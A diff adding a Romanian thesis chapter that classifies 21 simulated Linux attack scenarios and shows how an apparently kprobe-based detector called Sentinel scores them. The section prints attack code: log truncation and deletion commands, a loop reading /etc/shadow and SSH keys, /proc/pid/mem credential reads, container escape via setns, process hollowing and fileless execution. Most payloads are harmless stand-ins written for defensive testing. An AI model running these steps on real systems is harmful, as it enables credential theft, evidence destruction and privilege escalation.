@@ -219,6 +219,324 @@ REP-21 & Tentativă VM escape                   & PrivilegeEscalation & ISOLATE 
 \par REP-14 (process hollowing) necesită activarea \texttt{kernel.yama.ptrace\_scope=0} prin sysctl, deoarece Debian 12 restricționează implicit operațiunile ptrace la relații părinte-copil. Scenariul demonstrează că Sentinel detectează corect tehnica indiferent de configurația Yama, deoarece monitorizarea se face la nivelul syscall, nu la nivelul politicii Yama.
 
 
+\section{Clasificarea și descrierea teoretică a suitei de atacuri}
+\label{sec:attack_classification}
+
+\par Suita de 21 de scenarii de atac utilizată pentru validarea sistemului Sentinel a fost concepută pentru a acoperi exhaustiv tehnicile documentate în matricea MITRE ATT\&CK pentru Linux \cite{MITRE_ATTCK}. Pentru claritate arhitecturală, atacurile au fost grupate în șapte categorii fundamentale, acompaniate de secvențele de cod care declanșează anomaliile vizate.
+
+\subsection{Rootkit-uri și persistență la nivel de nucleu (Module LKM)}
+\label{subsec:attack_lkm}
+
+\par Această categorie vizează compromiterea directă a spațiului privilegiat prin încărcarea unor module malițioase (\textit{Loadable Kernel Modules}).
+
+\par \textbf{REP-01 (Diamorphine Rootkit):} Simulează mecanismul clasic de instalare a unui rootkit compilat pe disc. Utilizează utilitarul \texttt{insmod}, care invocă în fundal apelul \texttt{init\_module}. Sonda Sentinel nu analizează codul rootkit-ului, ci interceptează încărcătorul în sine:
+
+\begin{lstlisting}[style=cstyle,caption={REP-01: Modul de kernel inofensiv pentru declanșarea intercepției LKM}]
+static int __init harmless_kernel_module_init(void) {
+    printk(KERN_INFO "harmless_kernel_module: incarcat\n");
+    return 0; /* Kprobe-ul este declansat la intrarea in sys_init_module */
+}
+module_init(harmless_kernel_module_init);
+module_exit(harmless_kernel_module_exit);
+MODULE_LICENSE("GPL");
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{init\_module} (syscall 175) prin kprobe $\rightarrow$ contor \texttt{KernelModuleLoad} $\uparrow$ $\rightarrow$ scor $\approx 90$ $\rightarrow$ FREEZE.}
+
+\par \textbf{REP-17 (Persistență prin \texttt{finit\_module}):} O tehnică de evaziune ce permite încărcarea unui modul de kernel direct dintr-un descriptor de fișier, fără a lăsa urme pe disc. Scenariul folosește un script Python pentru a apela direct funcția C prin \texttt{ctypes}:
+
+\begin{lstlisting}[style=bashstyle,caption={REP-17: Apelarea finit\_module via ctypes în Python}]
+python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_finit_module = 313
+fd = os.open('persist_mod.ko', os.O_RDONLY | os.O_CLOEXEC)
+ret = libc.syscall(NR_finit_module, ctypes.c_int(fd), b'', ctypes.c_int(0))
+os.close(fd)
+"
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{finit\_module} (syscall 313) $\rightarrow$ același contor \texttt{KernelModuleLoad} ca REP-01, dar fără artefact pe disc; combinat cu \texttt{openat} pe fișierul \texttt{.ko} $\rightarrow$ scor $\approx 90$ $\rightarrow$ FREEZE.}
+
+\par \textbf{REP-18 (Rootkit bazat pe cârlige de sistem --- stil Reptile):} Instaurează un canal de comandă și control invizibil rețelei, interceptând apelul de sistem \texttt{kill} pentru a asculta semnale UNIX magice (ex. semnalul 64 pentru a acorda drepturi de root):
+
+\begin{lstlisting}[style=cstyle,caption={REP-18: Interceptarea semnalelor UNIX (stil Reptile)}]
+#define SIGNAL_HIDE_MODULE  31
+#define SIGNAL_HIDE_PROCESS 63
+#define SIGNAL_GET_ROOT     64
+
+static int kprobe_kill_pre(struct kprobe *p, struct pt_regs *regs) {
+    int sig = (int)regs->si;
+    switch (sig) {
+    case SIGNAL_GET_ROOT:
+        pr_warn("Tentativa de escaladare la root [blocat]"); break;
+    case SIGNAL_HIDE_PROCESS:
+        pr_warn("Tentativa de ascundere proces din /proc [blocat]"); break;
+    }
+    return 0;
+}
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{init\_module} la instalarea modulului $\rightarrow$ \texttt{KernelModuleLoad} $\uparrow$; odată rezident, modulul interceptează intern \texttt{kill} --- kprobe-ul Sentinel pe \texttt{kill} detectează semnalele cu valori $>$ 31 emise din procese neprivilegiate $\rightarrow$ scor $\approx 85$ $\rightarrow$ FREEZE.}
+
+\subsection{Injectarea de procese și manipularea memoriei}
+\label{subsec:attack_injection}
+
+\par Această clasă de atacuri ocolește mecanismele antivirus prin rularea codului malițios direct în spațiul de adresare al unor procese legitime, exploatând prevalent apelul \texttt{ptrace}.
+
+\par \textbf{REP-11 (Injecție clasică prin \texttt{ptrace}):} Simulează tehnica tradițională în care un proces malițios se atașează de o victimă pentru a-i altera execuția:
+
+\begin{lstlisting}[style=cstyle,caption={REP-11: Atașarea la un proces vizat prin ptrace}]
+printf("PTRACE_ATTACH la PID %d -- declanseaza kprobe nr 101\n", target);
+if (ptrace(PTRACE_ATTACH, target, NULL, NULL) == -1) {
+    perror("ptrace ATTACH a esuat (kprobe a fost totusi declansat)");
+    return 0;
+}
+waitpid(target, &status, 0);
+ptrace(PTRACE_GETREGS, target, NULL, &regs);
+ptrace(PTRACE_DETACH,  target, NULL, NULL);
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{ptrace} (syscall 101) cu \texttt{PTRACE\_ATTACH} $\rightarrow$ contor \texttt{ProcessInjection} $\uparrow$ $\rightarrow$ scor $\approx 75$ $\rightarrow$ FREEZE.}
+
+\par \textbf{REP-14 (Process Hollowing / RunPE):} Atacatorul lansează un proces legitim, îl suspendă, îi golește conținutul și alocă o nouă zonă de memorie pentru a plasa codul malițios:
+
+\begin{lstlisting}[style=cstyle,caption={REP-14: Etapele de golire a procesului (Process Hollowing)}]
+/* Etapa 1: Crearea victimei */
+pid_t victim = fork();
+if (victim == 0) { for(;;) pause(); }
+
+/* Etapa 2: Atasarea prin ptrace */
+ptrace(PTRACE_ATTACH, victim, NULL, NULL);
+waitpid(victim, &status, 0);
+
+/* Etapa 3: Alocarea bufferului RWX */
+void *inject_buf = mmap(NULL, 4096,
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+memcpy(inject_buf, payload, sizeof(payload));
+
+/* Etapa 4: Curatare */
+ptrace(PTRACE_DETACH, victim, NULL, NULL);
+kill(victim, SIGKILL);
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{ptrace} (syscall 101) $\rightarrow$ \texttt{ProcessInjection} $\uparrow$ și \texttt{mmap} anonim cu \texttt{PROT\_EXEC} $\rightarrow$ \texttt{MemoryInjection} $\uparrow$; scorul compus din doi contori $\rightarrow$ $\approx 88$ $\rightarrow$ FREEZE.}
+
+\par \textbf{REP-19 (Rootkit eBPF --- stil TripleCross):} Un atac hibrid care combină socket-uri brute, alocare de memorie invizibilă pe disc și injectare de procese \cite{TripleCross2022}:
+
+\begin{lstlisting}[style=cstyle,caption={REP-19: Lanțul de atac eBPF Rootkit}]
+/* Etapa 1: Socket brut pentru C2 */
+int raw_sock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
+
+/* Etapa 2: Alocare BPF fara artefacte pe disc */
+int memfd = (int)syscall(SYS_memfd_create, "ebpf_prog", 0);
+write(memfd, bpf_nop, sizeof(bpf_nop));
+
+/* Etapa 3: Alocare memorie executabila (JIT output) */
+void *jit_buf = mmap(NULL, 4096,
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+/* Etapa 4: Injectie in procesul victima via ptrace */
+ptrace(PTRACE_ATTACH, victim, NULL, NULL);
+\end{lstlisting}
+\par\textit{Sentinel interceptează 4 contori simultan: \texttt{socket(AF\_PACKET)} $\rightarrow$ \texttt{NetworkAnomaly}; \texttt{memfd\_create} și \texttt{mmap(RWX)} $\rightarrow$ \texttt{MemoryInjection} (de două ori); \texttt{ptrace} $\rightarrow$ \texttt{ProcessInjection} $\rightarrow$ scor $\approx 95$ $\rightarrow$ FREEZE.}
+
+\par \textbf{REP-20 (Furt de memorie în stil LSASS):} Atacul citește memoria procesului țintă pentru a extrage credențiale în clar, folosind pseudo-fișierul de memorie \cite{Bundles2021}:
+
+\begin{lstlisting}[style=cstyle,caption={REP-20: Extragerea credențialelor din memorie via /proc/pid/mem}]
+ptrace(PTRACE_ATTACH, victim, NULL, NULL);
+waitpid(victim, &st, 0);
+
+char mem_path[64];
+snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", victim);
+int memfd = open(mem_path, O_RDONLY);
+ssize_t n = pread(memfd, dump, sizeof(dump)-1, (off_t)rstart);
+close(memfd);
+
+ptrace(PTRACE_DETACH, victim, NULL, NULL);
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{ptrace} $\rightarrow$ \texttt{ProcessInjection} $\uparrow$ și \texttt{openat(\textquotedbl/proc/\textless pid\textgreater/mem\textquotedbl)} $\rightarrow$ \texttt{LSMFileWrite} $\uparrow$; combinație unică în activitatea legitimă $\rightarrow$ scor $\approx 85$ $\rightarrow$ FREEZE.}
+
+\subsection{Evaziunea defensivă: execuție \textit{fileless} și memorie RWX}
+\label{subsec:attack_fileless}
+
+\par Atacurile din această categorie evită interacțiunea cu sistemul de stocare, executând cod exclusiv în memoria RAM.
+
+\par \textbf{REP-07 (Injecție de shellcode în memorie RWX):} Alocă memorie simultan lizibilă, scriptibilă și executabilă, semnătura primară a malware-ului în memorie:
+
+\begin{lstlisting}[style=cstyle,caption={REP-07: Alocare și execuție shellcode în memorie RWX}]
+void *region = mmap(NULL, 4096,
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+/* Sled NOP finalizat cu RET (payload inofensiv) */
+unsigned char nop_sled[] = { 0x90, 0x90, 0x90, 0xC3 };
+memcpy(region, nop_sled, sizeof(nop_sled));
+
+mprotect(region, 4096, PROT_READ | PROT_EXEC);
+((void(*)(void))region)();
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{mmap} anonim cu \texttt{PROT\_EXEC} $\rightarrow$ \texttt{MemoryInjection} $\uparrow$ și \texttt{mprotect} pe regiune anonimă cu \texttt{PROT\_EXEC} $\rightarrow$ al doilea increment \texttt{MemoryInjection} $\rightarrow$ scor $\approx 45$ $\rightarrow$ WARN.}
+
+\par \textbf{REP-13 (Execuție fileless prin \texttt{memfd\_create}):} Lansează în execuție un binar ELF complet direct din memorie, fără ca executabilul să persiste pe disc \cite{Elastic2022}:
+
+\begin{lstlisting}[style=cstyle,caption={REP-13: Lanțul de execuție fileless via memfd\_create}]
+int memfd = (int)syscall(SYS_memfd_create, "sentinel_payload", 0);
+write(memfd, PAYLOAD_ELF, sizeof(PAYLOAD_ELF));
+
+char fd_path[64];
+snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", memfd);
+char *argv[] = { fd_path, NULL };
+execve(fd_path, argv, NULL); /* ELF ruleaza integral in memorie */
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{memfd\_create} (syscall 319) $\rightarrow$ \texttt{MemoryInjection} $\uparrow$ și \texttt{execve} cu cale \texttt{/proc/self/fd/N} $\rightarrow$ pattern \textit{fileless} recunoscut $\rightarrow$ scor $\approx 40$ $\rightarrow$ WARN.}
+
+\subsection{Anomalii de rețea, exfiltrare și C2}
+\label{subsec:attack_network}
+
+\par Această categorie testează detectarea comportamentelor atipice prin rețea, caracteristice canalelor de comandă și control.
+
+\par \textbf{REP-04 / REP-12 (Exfiltrare Netcat / Brute-force SSH):} Simulează rafale de apeluri \texttt{socket} și \texttt{connect} spre un host extern sau \texttt{localhost}:
+
+\begin{lstlisting}[style=cstyle,caption={REP-04 / REP-12: Rafală de conexiuni TCP anormale}]
+#define TARGET_IP   "127.0.0.1"
+#define TARGET_PORT 22
+#define BURST_N     20
+
+for (int i = 0; i < BURST_N; i++) {
+    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+    if (fd < 0) { perror("socket"); continue; }
+    connect(fd, (struct sockaddr *)&dst, sizeof(dst));
+    close(fd);
+}
+\end{lstlisting}
+\par\textit{Sentinel interceptează rafala de \texttt{socket} + \texttt{connect} (syscall-urile 41, 42); $\geq$ 10 perechi în fereastra de timp $\rightarrow$ contor \texttt{NetworkAnomaly} $\uparrow$ $\rightarrow$ scor $\approx 70$ $\rightarrow$ THROTTLE.}
+
+\par \textbf{REP-15 (Reverse Shell):} Combină activitatea de rețea cu anomaliile de execuție a shell-urilor, reproducând comportamentul unui implant de tip Meterpreter:
+
+\begin{lstlisting}[style=cstyle,caption={REP-15: Conexiune C2 urmată de instanțierea unui shell}]
+/* Bucla de conectare (similar comportamentului Meterpreter) */
+for (int i = 0; i < ATTEMPTS; i++) { /* socket + connect */ }
+
+/* Executia shell-ului care primeste I/O prin socket-ul de retea */
+char *argv[] = { "/bin/echo", "[REP-15] Shell inofensiv...", NULL };
+execve("/bin/echo", argv, NULL);
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{socket} + \texttt{connect} $\rightarrow$ \texttt{NetworkAnomaly} $\uparrow$, apoi \texttt{execve} din procesul cu socket activ $\rightarrow$ \texttt{ExecAnomaly} $\uparrow$; combinația rețea + exec $\rightarrow$ scor $\approx 80$ $\rightarrow$ THROTTLE/ISOLATE.}
+
+\subsection{Escaladarea privilegiilor și evadarea din medii izolate}
+\label{subsec:attack_privesc}
+
+\par Această categorie vizează depășirea restricțiilor contului curent prin exploatarea binarelor SUID sau evadarea din containere.
+
+\par \textbf{REP-02 (Escaladare de privilegii tip PwnKit):} Încearcă forțarea permisiunilor de root și a capabilităților POSIX, reproducând profilul de syscall al CVE-2021-4034 \cite{PwnKit2022}:
+
+\begin{lstlisting}[style=cstyle,caption={REP-02: Tentative eșuate dar interceptate de setuid și capset}]
+if (setuid(0) == -1)
+    printf("setuid(0) esuat: EPERM (asteptat) - kprobe declansat\n");
+
+struct __user_cap_header_struct hdr = {
+    .version = _LINUX_CAPABILITY_VERSION_3, .pid = 0
+};
+struct __user_cap_data_struct data[2] = {};
+if (syscall(SYS_capset, &hdr, data) == -1)
+    printf("capset esuat: EPERM (asteptat) - kprobe declansat\n");
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{setuid(0)} (syscall 105) și \texttt{capset} (syscall 126) $\rightarrow$ contor \texttt{PrivilegeEscalation} $\uparrow$ la fiecare apel, indiferent de rezultatul \texttt{EPERM} $\rightarrow$ scor $\approx 80$ $\rightarrow$ ISOLATE.}
+
+\par \textbf{REP-21 (Detectarea VM și evadarea prin namespace-uri):} Detectează mediul de execuție și forțează asocierea la structurile gazdei prin pivotarea namespace-urilor:
+
+\begin{lstlisting}[style=cstyle,caption={REP-21: Evadarea din container via namespace pivot}]
+/* Etapa 1: Detectare hypervisor prin CPUID (asamblor inline) */
+
+/* Etapa 2: Evadarea din container */
+chroot("/proc/1/root");
+
+int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
+setns(pidns_fd, CLONE_NEWPID); /* Pivot in namespace-ul PID al gazdei */
+
+int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
+setns(mntns_fd, CLONE_NEWNS);  /* Pivot in namespace-ul mount al gazdei */
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{openat(\textquotedbl/proc/1/ns/...\textquotedbl)} $\rightarrow$ \texttt{PrivilegeEscalation} $\uparrow$ și \texttt{setns} (syscall 308) $\rightarrow$ al doilea increment; \texttt{chroot} la \texttt{/proc/1/root} semnalează tentativa de evadare $\rightarrow$ scor $\approx 90$ $\rightarrow$ ISOLATE.}
+
+\subsection{Manipularea fișierelor, persistență și recoltare}
+\label{subsec:attack_files}
+
+\par Tehnicile din această categorie abuzează sistemul de fișiere pentru a ascunde urmele atacului sau pentru a menține persistența.
+
+\par \textbf{REP-08 (Alterarea fișierelor de jurnal / Log Tampering):} Utilizează \texttt{truncate} și \texttt{unlinkat} pentru a șterge urmele auditelor:
+
+\begin{lstlisting}[style=bashstyle,caption={REP-08: Alterarea fișierelor log în Bash}]
+truncate -s 0  /var/log/auth.log
+rm -f          /var/log/syslog
+mv             /var/log/kern.log /var/log/kern.log.bak
+echo "tampered" >> /var/log/dpkg.log
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{truncate}/\texttt{unlinkat} pe căi \texttt{/var/log/*} $\rightarrow$ contor \texttt{LSMFileWrite} $\uparrow$ pentru fiecare fișier de jurnal modificat $\rightarrow$ scor $\approx 50$ $\rightarrow$ WARN.}
+
+\par \textbf{REP-09 (Deturnarea bibliotecilor / LD\_PRELOAD Hijack):} Interceptează dinamic apelurile de bibliotecă legitime prin pre-încărcarea unei biblioteci partajate malițioase:
+
+\begin{lstlisting}[style=cstyle,caption={REP-09: Bibliotecă malițioasă pre-încărcată via LD\_PRELOAD}]
+int open(const char *pathname, int flags, ...) {
+    static int (*real_open)(const char *, int, ...) = NULL;
+    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
+    fprintf(stderr, "[fake_lib] open interceptat: %s\n", pathname);
+    va_list args; va_start(args, flags);
+    int mode = va_arg(args, int); va_end(args);
+    return real_open(pathname, flags, mode);
+}
+
+__attribute__((constructor)) void init(void) {
+    fprintf(stderr, "[fake_lib] INCARCAT prin LD_PRELOAD\n");
+}
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{openat} pe căile interceptate de bibliotecă $\rightarrow$ \texttt{LSMFileWrite} $\uparrow$; prezența \texttt{LD\_PRELOAD} în mediu este semnalată prin \texttt{execve} cu variabilă de mediu suspectă $\rightarrow$ scor $\approx 50$ $\rightarrow$ WARN.}
+
+\par \textbf{REP-16 (Recoltarea de credențiale):} Deschide iterativ fișiere critice de sistem, reproducând comportamentul unui enumerator de credențiale:
+
+\begin{lstlisting}[style=cstyle,caption={REP-16: Enumerarea fișierelor cu credențiale}]
+static const char *TARGETS[] = {
+    "/etc/shadow", "/etc/shadow-", "/root/.ssh/id_rsa",
+    "/proc/1/mem", "/root/.kube/config", NULL
+};
+for (int i = 0; TARGETS[i] != NULL; i++) {
+    int fd = open(TARGETS[i], O_RDONLY);
+    if (fd >= 0) { read(fd, buf, sizeof(buf)-1); close(fd); }
+}
+\end{lstlisting}
+\par\textit{Sentinel interceptează fiecare \texttt{openat} pe căile din lista neagră (\texttt{/etc/shadow}, \texttt{/root/.ssh/id\_rsa} etc.) $\rightarrow$ \texttt{LSMFileWrite} $\uparrow$ repetat; 5+ accese în rafală $\rightarrow$ scor $\approx 65$ $\rightarrow$ WARN/THROTTLE.}
+
+\subsection{Anomalii de execuție și epuizarea resurselor}
+\label{subsec:attack_exec}
+
+\par Această categorie acoperă abuzarea ierarhiei proceselor și consumul extrem de resurse.
+
+\par \textbf{REP-05 (Webshell Lineage):} Lansează utilitare interactive (\texttt{bash}, \texttt{whoami}) direct din procese numite după servere web (\texttt{apache2}, \texttt{nginx}), reproducând semnătura unui webshell:
+
+\begin{lstlisting}[style=cstyle,caption={REP-05: Lansarea unui shell de către un worker web}]
+/* Binarul este redenumit "apache2-worker" prin argv[0] */
+static void shell_cmd(const char *path, char *const argv[]) {
+    pid_t pid = fork();
+    if (pid == 0)      { execve(path, argv, NULL); _exit(1); }
+    else if (pid > 0)  { waitpid(pid, NULL, 0); }
+}
+
+int main(void) {
+    shell_cmd("/usr/bin/id",  id_args);
+    shell_cmd("/bin/cat",     cat_args); /* ex. /etc/passwd */
+}
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{execve} cu proces-părinte numit \texttt{apache2}/\texttt{nginx} $\rightarrow$ verifica lineage: server web $\Rightarrow$ shell interactiv $\rightarrow$ contor \texttt{ExecAnomaly} $\uparrow$ $\rightarrow$ scor $\approx 70$ $\rightarrow$ THROTTLE.}
+
+\par \textbf{REP-10 (Fork Bomb / Endpoint DoS):} Generează o rafală de procese efemere pentru a epuiza tabela PID a nucleului sau constrângerile \textit{cgroup}:
+
+\begin{lstlisting}[style=bashstyle,caption={REP-10: Fork Bomb limitat (200 de procese efemere)}]
+for i in $(seq 1 200); do
+    (exit 0) &   # Fortarea unei avalanse de apeluri 'clone'
+done
+wait
+\end{lstlisting}
+\par\textit{Sentinel interceptează \texttt{clone} (syscall 56) $\rightarrow$ contor \texttt{ForkBomb} $\uparrow$ la fiecare copil; $\geq$ 50 de apeluri \texttt{clone}/s $\rightarrow$ pragul de anomalie depășit $\rightarrow$ scor $\approx 75$ $\rightarrow$ ISOLATE via constrângere \texttt{cgroup}.}
+
+
 \section{Considerente de performanță}
 \label{sec:performance}
 
